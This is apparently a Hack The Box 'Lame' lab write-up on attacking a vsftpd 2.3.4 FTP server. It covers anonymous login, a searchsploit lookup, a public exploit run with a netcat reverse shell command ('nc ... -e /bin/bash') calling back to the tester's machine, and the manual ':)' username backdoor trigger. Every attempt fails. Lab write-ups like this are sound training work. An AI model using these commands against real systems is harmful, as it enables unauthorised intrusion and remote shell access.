# FTP Server

## Enumerating FTP Shares

I tried replicating the anonymous login:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:mac): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

This also exposed the FTP version name.

I tried listing files before doing anything else:

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

There was nothing.

## Trying VSFTP Exploit

I ran a `searchsploit` against `vsftpd`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ searchsploit vsftpd
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                         | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                         | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                         | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                                       | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                 | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

It seems there is a backdoor exploit for version 2.3.4. [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) gives a good overview on how it was introduced.

There was a metasploit module, which we don't want to use. I found a similar python exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ git clone https://github.com/ahervias77/vsftpd-2.3.4-exploit.git
```

The code doesn't seem to tell us much about how it works, but it looks like it uses a socket to setup a direct connection then supplies a command. It seems the code is exploiting a known backdoor that was introduced into the `vsftp` codebase.

Let's try a netcat reverse shell. First, setup a listener:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
```

Then attempt to send a shell with netcat back to our box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ python3 vsftpd_234_exploit.py 10.10.10.3 21 'nc 10.10.14.13 9001 -e /bin/bash'
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
```

This hung for a while. I eventually terminated it and tried a simpler command.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ python3 vsftpd_234_exploit.py 10.10.10.3 21 id
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
```

No luck.

## Trying the Exploit Manually

Instead, I tried to exploit it manually in case the exploit was broken. I followed a [great guide](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/) to do this, with a cool rundown of the exploit code:

![[Pasted image 20210503225240.png]]

The exploit involves triggering the backdoor by connecting to port 21 and supplying a username suffixed with a smiley face `:)`. Then the backdoor should open on port 6200 and give you a shell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ telnet 10.10.10.3 21
Trying 10.10.10.3...
Connected to 10.10.10.3.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
^]
telnet> Connection closed.
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ telnet 10.10.10.3 6200
Trying 10.10.10.3...
^C
```

The initial connection worked, but the shell didn't pop. We can also try with netcat:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
500 OOPS: priv_sock_get_result
```

No luck. Using `nmap` we can see the port isn't open:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ nmap -Pn -p 6200 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:35 BST
Nmap scan report for 10.10.10.3
Host is up.

PORT     STATE    SERVICE
6200/tcp filtered lm-x

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

This suggests we probably can't use this exploit.

# Tags

#writeup #oscp-prep #cve #ftp